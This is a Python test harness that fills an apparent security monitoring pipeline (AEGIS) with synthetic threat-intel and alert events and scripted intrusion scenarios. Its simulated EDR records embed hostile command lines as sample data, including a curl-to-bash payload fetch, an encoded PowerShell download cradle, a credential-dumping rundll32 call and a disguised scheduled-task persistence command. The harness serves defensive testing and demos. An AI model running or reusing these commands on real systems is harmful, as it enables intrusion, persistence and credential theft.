#!/usr/bin/env python3
"""
AEGIS Test Harness & Demo Data Generator

A comprehensive tool for testing the event pipeline and populating AEGIS
with realistic data for demos.

Modes
-----
  demo      Load a curated set of 30+ events across all source types, priorities,
            and routing targets. Designed to fill every dashboard panel with
            compelling data: advisories with kill chains, ingestion charts,
            ATT&CK heatmaps, and detection rules.

  scenario  Run a named attack scenario that injects a coherent multi-event
            intrusion sequence with realistic timing.

  stress    Flood the pipeline with N events to test throughput and backpressure.

  smoke     Quick validation — inject one event per source type and verify it
            arrives in the correct downstream queue within a timeout.

  status    Print pipeline health: queue depths, consumer lag, stream lengths.

Usage
-----
    python scripts/aegis_harness.py demo
    python scripts/aegis_harness.py demo --stream --delay 2
    python scripts/aegis_harness.py scenario --name apt29-intrusion
    python scripts/aegis_harness.py scenario --name ransomware-response
    python scripts/aegis_harness.py scenario --name supply-chain
    python scripts/aegis_harness.py stress --count 200 --rate 50
    python scripts/aegis_harness.py smoke
    python scripts/aegis_harness.py status

Environment
-----------
    REDIS_URL   Redis connection (default: redis://localhost:6379)
"""

from __future__ import annotations

import argparse
import json
import os
import random
import sys
import time
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any

import redis
from dotenv import load_dotenv

load_dotenv()

# ── Constants ─────────────────────────────────────────────────────────────────

INBOUND_STREAM    = "aegis:events:inbound"
TRIAGE_QUEUE      = "aegis:queue:triage"
SIMULATION_QUEUE  = "aegis:queue:simulation"
DETECTION_QUEUE   = "aegis:queue:detection"
ADVISORY_QUEUE    = "aegis:queue:advisory"
DLQ_STREAM        = "aegis:events:dlq"

ALL_QUEUES = {
    "inbound":    INBOUND_STREAM,
    "triage":     TRIAGE_QUEUE,
    "simulation": SIMULATION_QUEUE,
    "detection":  DETECTION_QUEUE,
    "advisory":   ADVISORY_QUEUE,
    "dlq":        DLQ_STREAM,
}

# ── Helpers ───────────────────────────────────────────────────────────────────

def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _ago(hours: int = 0, minutes: int = 0, days: int = 0) -> str:
    dt = datetime.now(timezone.utc) - timedelta(hours=hours, minutes=minutes, days=days)
    return dt.isoformat()


def _future(days: int) -> str:
    dt = datetime.now(timezone.utc) + timedelta(days=days)
    return dt.isoformat()


def _event(
    source_type: str,
    raw_payload: dict[str, Any],
    event_id: str | None = None,
    priority: str | None = None,
    routing_target: str | None = None,
    ttl: int = 86400,
) -> dict[str, str]:
    """Build a flat Redis stream entry matching AEGISEvent.to_redis_stream()."""
    fields: dict[str, str] = {
        "event_id": event_id or str(uuid.uuid4()),
        "source_type": source_type,
        "raw_payload": json.dumps(raw_payload, separators=(",", ":")),
        "ingested_at": _now(),
        "ttl": str(ttl),
    }
    if priority:
        fields["priority"] = priority
    if routing_target:
        fields["routing_target"] = routing_target
    return fields


def _nvd(cve_id: str, desc: str, cvss: float, severity: str,
         vector: str, cwe: str, hours_ago: int = 2,
         vuln_status: str = "Analyzed", refs: list[str] | None = None,
         **kw) -> dict[str, str]:
    """Shorthand for NVD CVE event."""
    payload = {
        "cve_id": cve_id,
        "published": _ago(hours=hours_ago),
        "lastModified": _ago(hours=max(1, hours_ago - 1)),
        "vulnStatus": vuln_status,
        "descriptions": [{"lang": "en", "value": desc}],
        "metrics": {
            "cvssMetricV31": [{
                "type": "Primary",
                "cvssData": {
                    "version": "3.1",
                    "vectorString": vector,
                    "baseScore": cvss,
                    "baseSeverity": severity,
                },
            }],
        },
        "weaknesses": [{"type": "Primary", "description": [{"lang": "en", "value": cwe}]}],
        "references": [{"url": u, "source": "vendor"} for u in (refs or [])],
        "configurations": [],
    }
    return _event("nvd", payload, **kw)


def _kev(cve_id: str, vendor: str, product: str, name: str, desc: str,
         action: str, ransomware: str = "Unknown", due_days: int = 14,
         **kw) -> dict[str, str]:
    """Shorthand for CISA KEV event."""
    return _event("cisa_kev", {
        "cve_id": cve_id,
        "vendor_project": vendor,
        "product": product,
        "vulnerability_name": name,
        "date_added": _ago(hours=random.randint(1, 12)),
        "short_description": desc,
        "required_action": action,
        "due_date": _future(due_days),
        "known_ransomware_campaign_use": ransomware,
    }, **kw)


def _edr(title: str, hostname: str, technique: str, severity: str,
         process: dict, desc: str, asset_id: str = "AS-001",
         ip: str = "10.10.5.101", os_name: str = "Windows 11",
         alert_type: str = "execution", **kw) -> dict[str, str]:
    """Shorthand for EDR alert event."""
    return _event("edr", {
        "alert_id": f"EDR-{random.randint(100000, 999999)}",
        "hostname": hostname,
        "asset_id": asset_id,
        "ip": ip,
        "os": os_name,
        "severity": severity,
        "alert_type": alert_type,
        "title": title,
        "description": desc,
        "mitre_technique": technique,
        "process": process,
        "timestamp": _now(),
        "agent_version": "7.3.0",
    }, **kw)


def _siem(rule_name: str, technique: str, desc: str, severity: str = "high",
          event_count: int = 100, rule_id: str | None = None,
          targets: list[dict] | None = None, **kw) -> dict[str, str]:
    """Shorthand for SIEM correlation event."""
    return _event("siem", {
        "rule_id": rule_id or f"SIEM-{random.randint(1000, 9999)}",
        "rule_name": rule_name,
        "severity": severity,
        "event_count": event_count,
        "time_window_minutes": random.choice([5, 10, 15, 30]),
        "source_ips": [f"10.10.{random.randint(1,10)}.{random.randint(1,254)}" for _ in range(random.randint(1, 5))],
        "target": targets[0] if targets else {"hostname": "dc-primary", "ip": "10.10.3.10"},
        "mitre_technique": technique,
        "description": desc,
        "timestamp": _now(),
    }, **kw)


def _threatfox(ioc_value: str, ioc_type: str, malware: str,
               threat_type: str = "botnet_cc", confidence: int = 90,
               tags: list[str] | None = None, **kw) -> dict[str, str]:
    """Shorthand for ThreatFox IOC event."""
    return _event("threatfox", {
        "ioc_id": random.randint(1000000, 9999999),
        "ioc_type": ioc_type,
        "ioc_value": ioc_value,
        "threat_type": threat_type,
        "malware": malware,
        "confidence_level": confidence,
        "first_seen": _ago(days=random.randint(1, 14)),
        "last_seen": _ago(hours=random.randint(1, 24)),
        "reporter": "abuse_ch",
        "tags": tags or [],
    }, **kw)


def _stix(indicator_name: str, actor_name: str, pattern: str,
          phases: list[str], actor_aliases: list[str] | None = None,
          **kw) -> dict[str, str]:
    """Shorthand for STIX 2.1 bundle event."""
    return _event("stix", {
        "type": "bundle",
        "id": f"bundle--{uuid.uuid4()}",
        "spec_version": "2.1",
        "objects": [
            {
                "type": "indicator",
                "id": f"indicator--{uuid.uuid4()}",
                "created": _ago(hours=6),
                "modified": _ago(hours=1),
                "name": indicator_name,
                "pattern": pattern,
                "pattern_type": "stix",
                "valid_from": _ago(days=30),
                "labels": ["malicious-activity", "apt"],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": p}
                    for p in phases
                ],
            },
            {
                "type": "threat-actor",
                "id": f"threat-actor--{uuid.uuid4()}",
                "created": _ago(days=7),
                "name": actor_name,
                "aliases": actor_aliases or [],
                "threat_actor_types": ["nation-state"],
            },
        ],
    }, **kw)


def _misp(info: str, techniques: list[str], actors: list[str],
          cve_ids: list[str] | None = None, tlp: str = "tlp:amber",
          threat_level: str = "1", **kw) -> dict[str, str]:
    """Shorthand for MISP event."""
    return _event("misp", {
        "misp_event_id": str(random.randint(10000, 99999)),
        "misp_uuid": str(uuid.uuid4()),
        "info": info,
        "title": info,
        "cve_ids": cve_ids or [],
        "cve_id": cve_ids[0] if cve_ids else None,
        "misp_techniques": techniques,
        "misp_technique_details": [{"technique_id": t, "name": t} for t in techniques],
        "threat_actors": actors,
        "tlp": tlp,
        "threat_level_id": threat_level,
        "analysis": "2",
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
    }, **kw)


# ══════════════════════════════════════════════════════════════════════════════
# DEMO MODE – curated events for a compelling dashboard
# ══════════════════════════════════════════════════════════════════════════════

def build_demo_events() -> list[dict[str, str]]:
    """Return a curated set of events that populate every dashboard panel."""
    events: list[dict[str, str]] = []

    # ── Critical CVEs (P0) — active exploitation, high CVSS ───────────────
    events.append(_nvd(
        "CVE-2025-22457", "Stack-based buffer overflow in Ivanti Connect Secure before 22.7R2.6 "
        "allows unauthenticated remote code execution via crafted HTTP requests. Actively "
        "exploited by UNC5221 (China-nexus) since mid-March 2025.",
        9.0, "CRITICAL", "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H", "CWE-121",
        refs=["https://forums.ivanti.com/s/article/April-Security-Advisory"],
    ))
    events.append(_nvd(
        "CVE-2024-3400", "PAN-OS GlobalProtect gateway command injection vulnerability "
        "allowing unauthenticated remote code execution. Actively exploited in the wild "
        "by multiple threat actors including UTA0218.",
        10.0, "CRITICAL", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", "CWE-77",
        refs=["https://security.paloaltonetworks.com/CVE-2024-3400"],
    ))
    events.append(_nvd(
        "CVE-2024-21762", "Fortinet FortiOS out-of-bounds write in SSL-VPN daemon allows "
        "unauthenticated remote code execution via specially crafted HTTP requests.",
        9.8, "CRITICAL", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "CWE-787",
        refs=["https://fortiguard.com/psirt/FG-IR-24-015"],
    ))
    events.append(_nvd(
        "CVE-2025-29927", "Next.js middleware authorization bypass via crafted "
        "x-middleware-subrequest header allows unauthenticated access to protected routes.",
        9.1, "CRITICAL", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "CWE-285",
        refs=["https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jh2h-7qhg"],
    ))

    # ── High CVEs (P1) — significant but not actively exploited ───────────
    events.append(_nvd(
        "CVE-2023-4966", "Citrix NetScaler ADC/Gateway sensitive information disclosure "
        "allows session token leakage enabling session hijack (Citrix Bleed).",
        9.4, "CRITICAL", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "CWE-119",
        hours_ago=12,
    ))
    events.append(_nvd(
        "CVE-2024-47575", "FortiManager missing authentication for critical function "
        "allows remote unauthenticated attacker to execute arbitrary code via FGFM protocol.",
        9.8, "CRITICAL", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "CWE-306",
        hours_ago=8,
    ))
    events.append(_nvd(
        "CVE-2024-9474", "Palo Alto Networks PAN-OS privilege escalation in management "
        "web interface allows admin to perform actions as root.",
        7.2, "HIGH", "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "CWE-78",
        hours_ago=18,
    ))

    # ── Medium CVEs (P2) ──────────────────────────────────────────────────
    events.append(_nvd(
        "CVE-2023-44487", "HTTP/2 Rapid Reset denial of service via rapid stream "
        "cancellation. Affects nginx, Apache httpd, IIS, and most HTTP/2 stacks.",
        7.5, "HIGH", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", "CWE-400",
        hours_ago=48,
    ))
    events.append(_nvd(
        "CVE-2024-38063", "Windows TCP/IP remote code execution vulnerability via "
        "specially crafted IPv6 packets. No user interaction required.",
        9.8, "CRITICAL", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "CWE-191",
        hours_ago=72,
    ))

    # ── Low CVEs (P3) ─────────────────────────────────────────────────────
    events.append(_nvd(
        "CVE-2024-0519", "Out-of-bounds memory access in V8 in Google Chrome prior "
        "to 120.0.6099.224 via crafted HTML page.",
        3.1, "LOW", "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N", "CWE-787",
        hours_ago=720, vuln_status="Modified",
    ))

    # ── CISA KEV (P0) ────────────────────────────────────────────────────
    events.append(_kev(
        "CVE-2025-22457", "Ivanti", "Connect Secure",
        "Ivanti Connect Secure Stack Buffer Overflow",
        "Ivanti Connect Secure, Policy Secure, and ZTA Gateways contain a stack-based "
        "buffer overflow that allows unauthenticated remote code execution.",
        "Apply vendor patch 22.7R2.6 or later. Run Ivanti ICT integrity checker.",
        ransomware="Known", due_days=7,
    ))
    events.append(_kev(
        "CVE-2024-3400", "Palo Alto Networks", "PAN-OS",
        "PAN-OS Command Injection Vulnerability",
        "PAN-OS GlobalProtect feature contains a command injection vulnerability.",
        "Apply mitigations per vendor instructions or discontinue use.",
        ransomware="Known", due_days=14,
    ))
    events.append(_kev(
        "CVE-2024-21762", "Fortinet", "FortiOS",
        "FortiOS Out-of-Bound Write Vulnerability",
        "FortiOS SSL-VPN daemon contains an OOB write allowing unauthenticated RCE.",
        "Apply vendor updates. Disable SSL VPN as interim mitigation.",
        due_days=7,
    ))
    events.append(_kev(
        "CVE-2024-47575", "Fortinet", "FortiManager",
        "FortiManager Missing Authentication",
        "FortiManager FGFM daemon allows unauthenticated code execution.",
        "Apply FortiManager 7.6.1 update. Restrict FGFM access to known FortiGate IPs.",
        due_days=10,
    ))

    # ── EDR Alerts (P0) ──────────────────────────────────────────────────
    events.append(_edr(
        "LSASS Memory Access — Credential Dumping", "ws-exec-001", "T1003.001", "critical",
        {"name": "rundll32.exe", "pid": 4892, "ppid": 3104, "user": "CORP\\admin.jdoe",
         "cmdline": "rundll32.exe C:\\Windows\\Temp\\tmp4829.dll,DumpCreds"},
        "Suspicious process accessed LSASS memory using OpenProcess with PROCESS_VM_READ. "
        "Consistent with Mimikatz credential dumping.",
        alert_type="credential_access", asset_id="AS-012",
    ))
    events.append(_edr(
        "Reverse Shell Spawned by Web Server", "web-prod-01", "T1059.004", "critical",
        {"name": "bash", "pid": 28412, "ppid": 1847, "user": "www-data",
         "cmdline": "/bin/bash -c 'curl http://45.77.65.211/payload.sh | bash'"},
        "nginx worker spawned /bin/bash with outbound connection to known C2 IP.",
        os_name="Ubuntu 22.04", ip="10.10.1.11", asset_id="AS-001",
    ))
    events.append(_edr(
        "Scheduled Task Persistence via schtasks", "ws-finance-003", "T1053.005", "high",
        {"name": "schtasks.exe", "pid": 7234, "ppid": 4100, "user": "CORP\\svc.backup",
         "cmdline": 'schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -f C:\\ProgramData\\update.ps1" /sc onlogon'},
        "Persistence mechanism created via scheduled task masquerading as Windows Update.",
        alert_type="persistence", asset_id="AS-019", ip="10.10.4.33",
    ))
    events.append(_edr(
        "PowerShell Base64 Encoded Command Execution", "dc-primary", "T1059.001", "critical",
        {"name": "powershell.exe", "pid": 9102, "ppid": 892, "user": "NT AUTHORITY\\SYSTEM",
         "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkACcAKQA="},
        "Encoded PowerShell downloading payload from internal staging server. Likely post-exploitation.",
        alert_type="execution", asset_id="AS-007", ip="10.10.3.10",
    ))

    # ── SIEM Correlation Alerts (P1) ──────────────────────────────────────
    events.append(_siem(
        "Brute Force Authentication — Domain Controller", "T1110.001",
        "847 failed NTLM auth attempts from 3 internal workstations in 15 minutes. "
        "3 successful logins after failures suggest credential stuffing success.",
        event_count=847,
    ))
    events.append(_siem(
        "Lateral Movement — SMB Admin Share Access", "T1021.002",
        "Host ws-exec-001 accessed ADMIN$ and C$ shares on 3 servers in 5 minutes "
        "using service account. Consistent with pass-the-hash lateral movement.",
        event_count=12,
        targets=[{"hostname": "db-primary-01", "ip": "10.10.2.11", "asset_id": "AS-004"}],
    ))
    events.append(_siem(
        "DNS Tunneling — Excessive TXT Queries", "T1071.004",
        "Workstation ws-exec-001 issued 12,000+ TXT DNS queries to c2.evil-domain.com "
        "in 1 hour. Entropy analysis confirms data exfiltration via DNS tunneling.",
        event_count=12847, severity="critical",
    ))
    events.append(_siem(
        "Kerberoasting — SPN Service Ticket Requests", "T1558.003",
        "Single host requested TGS tickets for 23 SPNs in 2 minutes. "
        "Consistent with Kerberoasting attack to harvest service account hashes.",
        event_count=23,
    ))

    # ── ThreatFox IOCs (P1) ──────────────────────────────────────────────
    events.append(_threatfox(
        "45.77.65.211:443", "ip:port", "CobaltStrike",
        tags=["cobalt-strike", "c2", "APT29"],
    ))
    events.append(_threatfox(
        "update-service-cdn.com", "domain", "BlackCat",
        threat_type="botnet_cc", confidence=95,
        tags=["alphv", "ransomware", "blackcat", "c2"],
    ))
    events.append(_threatfox(
        "185.220.101.34:8443", "ip:port", "Sliver",
        tags=["sliver", "c2", "red-team-tool"],
    ))
    events.append(_threatfox(
        "a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8", "md5_hash", "LockBit",
        threat_type="payload_delivery", confidence=98,
        tags=["lockbit", "ransomware", "locker"],
    ))

    # ── STIX Intel Bundles (P3) ──────────────────────────────────────────
    events.append(_stix(
        "Volt Typhoon Living-off-the-Land C2 Pattern", "Volt Typhoon",
        "[network-traffic:dst_port IN (5985, 5986)]",
        ["command-and-control", "lateral-movement"],
        actor_aliases=["BRONZE SILHOUETTE", "Dev-0391"],
    ))
    events.append(_stix(
        "LockBit 3.0 Ransomware Deployment Chain", "LockBit",
        "[file:hashes.'SHA-256' = 'a3b4c5d6e7f8...']",
        ["initial-access", "impact"],
        actor_aliases=["LockBit Black"],
    ))
    events.append(_stix(
        "Lazarus Group Cryptocurrency Supply Chain", "Lazarus Group",
        "[process:command_line LIKE '%npm install%']",
        ["initial-access", "collection"],
        actor_aliases=["HIDDEN COBRA", "APT38"],
    ))
    events.append(_stix(
        "APT29 OAuth Token Theft via Cloud Service", "APT29",
        "[network-traffic:dst_ref.value LIKE '%.microsoftonline.com']",
        ["credential-access", "collection"],
        actor_aliases=["Cozy Bear", "Midnight Blizzard"],
    ))

    # ── MISP Events (P1) ─────────────────────────────────────────────────
    events.append(_misp(
        "APT29 targets government networks with novel backdoor via Ivanti VPN exploit",
        ["T1190", "T1059.001", "T1547.001", "T1071.001"],
        ["APT29"], cve_ids=["CVE-2025-22457"],
    ))
    events.append(_misp(
        "Volt Typhoon pre-positions on US critical infrastructure — water utilities",
        ["T1190", "T1078", "T1021.002", "T1562.001"],
        ["Volt Typhoon"], cve_ids=["CVE-2024-3400"],
    ))
    events.append(_misp(
        "LockBit affiliate leveraging FortiOS SSL-VPN for initial access",
        ["T1190", "T1059.001", "T1486"],
        ["LockBit"], cve_ids=["CVE-2024-21762"],
        tlp="tlp:red", threat_level="1",
    ))
    events.append(_misp(
        "Sandworm targets European energy sector with new wiper malware",
        ["T1190", "T1059.004", "T1485", "T1561.002"],
        ["Sandworm"], cve_ids=["CVE-2024-47575"],
        tlp="tlp:red", threat_level="1",
    ))

    return events


# ══════════════════════════════════════════════════════════════════════════════
# SCENARIOS – coherent multi-event intrusion sequences
# ══════════════════════════════════════════════════════════════════════════════

def _scenario_apt29_intrusion() -> list[tuple[float, dict[str, str]]]:
    """
    APT29 full intrusion chain:
    1. MISP intel warning
    2. CISA KEV for Ivanti CVE
    3. EDR: webshell on VPN appliance
    4. SIEM: lateral movement to DC
    5. EDR: credential dumping on DC
    6. SIEM: Kerberoasting
    7. EDR: data staging
    8. ThreatFox: C2 beacon detected
    """
    prefix = "APT29-DEMO"
    return [
        (0, _misp(
            "APT29 actively exploiting Ivanti Connect Secure (CVE-2025-22457) — urgent",
            ["T1190", "T1059.001", "T1547.001", "T1071.001", "T1003.001"],
            ["APT29", "Cozy Bear"],
            cve_ids=["CVE-2025-22457"], tlp="tlp:red",
            event_id=f"{prefix}-01-intel",
        )),
        (3, _kev(
            "CVE-2025-22457", "Ivanti", "Connect Secure",
            "Ivanti Connect Secure Stack Buffer Overflow",
            "Stack-based buffer overflow allows unauthenticated RCE.",
            "Patch to 22.7R2.6 immediately. Run integrity checker.",
            ransomware="Known", event_id=f"{prefix}-02-kev",
        )),
        (5, _edr(
            "Web Shell Detected on VPN Appliance", "vpn-gw-01", "T1505.003", "critical",
            {"name": "python3", "pid": 1247, "ppid": 1001, "user": "www-data",
             "cmdline": "python3 /tmp/.cache/webshell.py"},
            "Web shell process spawned under Ivanti web server context. Outbound C2 to "
            "185.220.101.34:8443. File hash matches known APT29 tooling.",
            os_name="Linux", ip="10.10.0.5", asset_id="AS-VPN-01",
            event_id=f"{prefix}-03-webshell",
        )),
        (8, _siem(
            "Lateral Movement — RDP from VPN to Domain Controller", "T1021.001",
            "VPN gateway vpn-gw-01 (10.10.0.5) initiated RDP session to dc-primary "
            "(10.10.3.10). VPN appliances should not RDP to internal servers.",
            event_count=1, severity="critical",
            event_id=f"{prefix}-04-lateral",
        )),
        (12, _edr(
            "DCSync Attack — Domain Replication Request", "dc-primary", "T1003.006", "critical",
            {"name": "lsass.exe", "pid": 764, "ppid": 4, "user": "NT AUTHORITY\\SYSTEM",
             "cmdline": "lsass.exe"},
            "Non-DC host ws-exec-001 issued DRS GetNCChanges replication request. "
            "Consistent with DCSync attack to dump all domain credentials.",
            ip="10.10.3.10", asset_id="AS-007",
            alert_type="credential_access",
            event_id=f"{prefix}-05-dcsync",
        )),
        (15, _siem(
            "Kerberoasting — Mass SPN Ticket Requests", "T1558.003",
            "Compromised account CORP\\admin.jdoe requested TGS tickets for 47 service "
            "principals in 90 seconds from dc-primary.",
            event_count=47, severity="high",
            event_id=f"{prefix}-06-kerberoast",
        )),
        (18, _edr(
            "Data Staging — Large Archive Created", "file-server-01", "T1074.001", "high",
            {"name": "7z.exe", "pid": 5521, "ppid": 4100, "user": "CORP\\svc.backup",
             "cmdline": "7z.exe a -p C:\\ProgramData\\backup.7z C:\\Shares\\Finance\\*"},
            "7z creating password-protected archive of Finance share. 2.3 GB staged "
            "to C:\\ProgramData. Unusual for service account at this time.",
            ip="10.10.2.20", asset_id="AS-008",
            alert_type="collection",
            event_id=f"{prefix}-07-staging",
        )),
        (20, _threatfox(
            "185.220.101.34:8443", "ip:port", "Sliver",
            tags=["sliver", "apt29", "c2", "cobalt-strike-alternative"],
            event_id=f"{prefix}-08-c2",
        )),
    ]


def _scenario_ransomware_response() -> list[tuple[float, dict[str, str]]]:
    """
    LockBit ransomware response scenario:
    1. ThreatFox IOC for LockBit C2
    2. NVD disclosure for FortiOS CVE
    3. KEV entry
    4. EDR: PowerShell download cradle
    5. SIEM: mass file encryption
    6. EDR: ransomware note dropped
    7. MISP: campaign correlation
    """
    prefix = "RANSOM-DEMO"
    return [
        (0, _threatfox(
            "update-service-cdn.com", "domain", "LockBit",
            threat_type="botnet_cc", confidence=98,
            tags=["lockbit", "ransomware", "affiliate-program"],
            event_id=f"{prefix}-01-ioc",
        )),
        (2, _nvd(
            "CVE-2024-21762",
            "FortiOS SSL-VPN out-of-bounds write allows unauthenticated RCE.",
            9.8, "CRITICAL", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "CWE-787",
            event_id=f"{prefix}-02-cve",
        )),
        (4, _kev(
            "CVE-2024-21762", "Fortinet", "FortiOS",
            "FortiOS Out-of-Bound Write",
            "SSL-VPN daemon OOB write allows unauthenticated RCE.",
            "Apply vendor updates. Disable SSL VPN as interim mitigation.",
            ransomware="Known",
            event_id=f"{prefix}-03-kev",
        )),
        (7, _edr(
            "PowerShell Download Cradle via Encoded Command", "ws-finance-003",
            "T1059.001", "critical",
            {"name": "powershell.exe", "pid": 8821, "ppid": 1200, "user": "CORP\\admin.ops",
             "cmdline": "powershell -ep bypass -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQA..."},
            "Encoded PowerShell execution downloading second-stage from update-service-cdn.com. "
            "Parent is fortigate vpn process — likely post-exploitation of CVE-2024-21762.",
            ip="10.10.4.33", asset_id="AS-019",
            event_id=f"{prefix}-04-pwsh",
        )),
        (12, _siem(
            "Mass File Encryption — Ransomware Indicators", "T1486",
            "File server detected 15,000+ file rename operations (.lockbit extension) "
            "within 3 minutes. Shadow copies deleted via vssadmin. Active ransomware event.",
            event_count=15247, severity="critical",
            rule_id="SIEM-RANSOM-001",
            event_id=f"{prefix}-05-encrypt",
        )),
        (14, _edr(
            "Ransomware Note Dropped — LockBit 3.0", "file-server-01", "T1486", "critical",
            {"name": "lockbit.exe", "pid": 6612, "ppid": 8821, "user": "CORP\\admin.ops",
             "cmdline": "lockbit.exe --encrypt-all --note"},
            "LockBit 3.0 ransomware binary executing. Ransom notes dropped in every directory. "
            "Wallpaper changed. Volume shadow copies already deleted.",
            ip="10.10.2.20", asset_id="AS-008",
            event_id=f"{prefix}-06-ransom",
        )),
        (16, _misp(
            "LockBit affiliate campaign via FortiOS CVE-2024-21762 — active intrusions",
            ["T1190", "T1059.001", "T1486", "T1490"],
            ["LockBit"], cve_ids=["CVE-2024-21762"],
            tlp="tlp:red",
            event_id=f"{prefix}-07-misp",
        )),
    ]


def _scenario_supply_chain() -> list[tuple[float, dict[str, str]]]:
    """
    Supply chain compromise scenario:
    1. STIX intel on Lazarus supply chain pattern
    2. SIEM: suspicious NPM package install on CI runner
    3. EDR: reverse shell from Node.js
    4. SIEM: unusual outbound to crypto exchange API
    5. ThreatFox: C2 infrastructure match
    6. MISP: campaign correlation
    """
    prefix = "SUPPLY-DEMO"
    return [
        (0, _stix(
            "Lazarus Group Trojanized NPM Package Distribution", "Lazarus Group",
            "[process:command_line LIKE '%npm install%' AND network-traffic:dst_ref.value = '185.29.8.%']",
            ["initial-access", "execution"],
            actor_aliases=["HIDDEN COBRA", "APT38"],
            event_id=f"{prefix}-01-stix",
        )),
        (4, _siem(
            "Suspicious NPM Package — Post-Install Script Execution", "T1195.002",
            "CI runner ci-runner-01 executed suspicious post-install script from npm package "
            "'@internal/auth-utils'. Package installed from non-standard registry. "
            "Script contacted 185.29.8.47:443.",
            event_count=3, severity="high",
            event_id=f"{prefix}-02-siem",
        )),
        (7, _edr(
            "Reverse Shell from Node.js Process", "ci-runner-01", "T1059.007", "critical",
            {"name": "node", "pid": 15234, "ppid": 15100, "user": "ci-user",
             "cmdline": "node /home/ci-user/.npm/_postinstall/payload.js"},
            "Node.js process spawned by npm post-install hook established reverse shell "
            "to 185.29.8.47:443. Process accessing AWS credential files.",
            os_name="Ubuntu 22.04", ip="10.10.6.10", asset_id="AS-015",
            event_id=f"{prefix}-03-shell",
        )),
        (10, _siem(
            "Unusual Outbound — Cryptocurrency Exchange API", "T1048.002",
            "CI runner ci-runner-01 making API calls to Binance and Kraken exchange APIs. "
            "Using AWS credentials from /home/ci-user/.aws/credentials. "
            "No legitimate reason for CI infrastructure to access exchange APIs.",
            event_count=47, severity="critical",
            event_id=f"{prefix}-04-exfil",
        )),
        (13, _threatfox(
            "185.29.8.47:443", "ip:port", "Lazarus",
            tags=["lazarus", "apt38", "cryptocurrency", "supply-chain"],
            event_id=f"{prefix}-05-ioc",
        )),
        (15, _misp(
            "Lazarus Group targeting cryptocurrency exchanges via NPM supply chain",
            ["T1195.002", "T1059.007", "T1552.001", "T1048.002"],
            ["Lazarus Group", "APT38"],
            tlp="tlp:amber",
            event_id=f"{prefix}-06-misp",
        )),
    ]


SCENARIOS: dict[str, callable] = {
    "apt29-intrusion":    _scenario_apt29_intrusion,
    "ransomware-response": _scenario_ransomware_response,
    "supply-chain":       _scenario_supply_chain,
}


# ══════════════════════════════════════════════════════════════════════════════
# STRESS MODE
# ══════════════════════════════════════════════════════════════════════════════

def build_stress_events(count: int) -> list[dict[str, str]]:
    """Generate N randomised events for throughput testing."""
    sources = ["nvd", "cisa_kev", "edr", "siem", "threatfox", "stix", "misp"]
    priorities = ["P0", "P1", "P2", "P3"]
    weights = [0.1, 0.25, 0.4, 0.25]  # realistic distribution
    cves = [
        "CVE-2024-3400", "CVE-2024-21762", "CVE-2023-4966", "CVE-2025-22457",
        "CVE-2024-47575", "CVE-2023-44487", "CVE-2024-38063", "CVE-2024-9474",
        "CVE-2024-0519", "CVE-2025-29927", "CVE-2024-23113", "CVE-2024-20353",
    ]
    events = []
    for i in range(count):
        src = random.choice(sources)
        pri = random.choices(priorities, weights=weights, k=1)[0]
        cve = random.choice(cves)
        cvss = round(random.uniform(2.0, 10.0), 1)
        events.append(_event(src, {
            "cve_id": cve,
            "descriptions": [{"lang": "en", "value": f"Stress test event {i+1} for {cve}"}],
            "metrics": {"cvssMetricV31": [{"type": "Primary", "cvssData": {"baseScore": cvss}}]},
        }, event_id=f"STRESS-{i+1:05d}", priority=pri, routing_target="triage"))
    return events


# ══════════════════════════════════════════════════════════════════════════════
# SMOKE TEST
# ══════════════════════════════════════════════════════════════════════════════

def run_smoke(r: redis.Redis) -> bool:
    """
    Inject one event per source type and verify it lands in the expected
    downstream queue within a timeout.
    """
    print("\n  SMOKE TEST — one event per source type\n")

    routing = {
        "cisa_kev": "triage", "edr": "detection", "siem": "triage",
        "threatfox": "triage", "nvd": "advisory", "stix": "simulation",
        "misp": "triage",
    }

    # Record current queue lengths
    before = {}
    for name, key in ALL_QUEUES.items():
        before[name] = r.xlen(key)

    test_events = [
        _nvd("CVE-SMOKE-001", "Smoke test NVD event", 7.5, "HIGH",
             "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "CWE-79",
             event_id="SMOKE-nvd"),
        _kev("CVE-SMOKE-002", "Test", "Product", "Test KEV", "Smoke test KEV",
             "Apply patches", event_id="SMOKE-cisa_kev"),
        _edr("Smoke Test EDR Alert", "test-host", "T1059", "high",
             {"name": "test.exe", "pid": 1}, "Smoke test EDR event",
             event_id="SMOKE-edr"),
        _siem("Smoke Test SIEM Rule", "T1078", "Smoke test SIEM event",
              event_id="SMOKE-siem"),
        _threatfox("1.2.3.4:443", "ip:port", "TestMalware",
                   event_id="SMOKE-threatfox"),
        _stix("Smoke Test Indicator", "TestActor", "[ipv4-addr:value = '1.2.3.4']",
